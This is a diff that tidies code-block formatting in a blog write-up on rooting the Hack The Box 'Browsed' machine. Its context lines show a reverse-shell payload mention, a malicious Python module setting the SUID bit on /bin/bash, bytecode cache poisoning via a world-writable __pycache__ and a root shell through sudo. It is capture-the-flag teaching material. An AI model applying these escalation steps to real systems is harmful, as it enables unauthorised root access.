@@ -28,9 +28,7 @@ description: "A detailed walkthrough of how I rooted the Browsed machine on Hack
 
 We began with a standard nmap scan to identify open ports on the target `browsed.htb`.
 
-Bash
-
-```
+```bash 
 nmap -sC -sV -oN nmap/initial 10.129.12.157
 ```
 
@@ -74,8 +72,6 @@ _“This webapp allows us to convert our md files to html… it should only run 
 We identified that the Markdown Preview service (likely running on Flask or similar) was vulnerable to command injection via the `cmd` or similar parameters in a POST request. We updated our `content.js` to send a reverse shell payload.
 
 **The Payload (`content.js`):**
-
-JavaScript
 
 ```javascript
 // 1. The target is the internal Flask app
@@ -123,8 +119,6 @@ larry@browsed:~$ sudo -l
 
 Investigating the script, we saw it imports a local module named `extension_utils`:
 
-Python
-
 ```python
 #!/usr/bin/python3.12
 ...
@@ -134,9 +128,7 @@ from extension_utils import validate_manifest, clean_temp_files
 
 Checking permissions on the directory:
 
-Bash
-
-```
+```bash
 ls -la /opt/extensiontool/__pycache__/
 drwxrwxrwx 2 root root 4096 ...
 ```
@@ -153,8 +145,6 @@ Since we can write to `__pycache__`, we can create a malicious `.pyc` file. Howe
 
 We created `extension_utils.py` in `/tmp` to set the SUID bit on `/bin/bash`.
 
-Python
-
 ```python
 # /tmp/extension_utils.py
 import os
@@ -164,8 +154,6 @@ os.system("chmod +s /bin/bash")
 ### Step 2: Compile to Bytecode
 
 We compiled it using the exact version found on the target (Python 3.12).
-
-Bash
 
 ```bash
 python3.12 -m py_compile extension_utils.py
@@ -213,17 +201,13 @@ print("[+] Cache poisoned.")
     
 3. Executed the sudo command:
     
-    Bash
-    
-    ```
+    ```bash
     sudo /opt/extensiontool/extension_tool.py --help
     ```
     
 4. The script crashed with an `ImportError` (because our fake module didn't actually have the functions the main script wanted), but the **top-level code executed first**.
     
 5. Checking bash permissions:
-    
-    Bash
     
     ```bash
     ls -la /bin/bash
@@ -232,9 +216,7 @@ print("[+] Cache poisoned.")
     
 6. Escalated to root:
     
-    Bash
-    
-    ```
+    ```bash
     /bin/bash -p
     # id
     # uid=1000(larry) gid=1000(larry) euid=0(root) groups=0(root)...
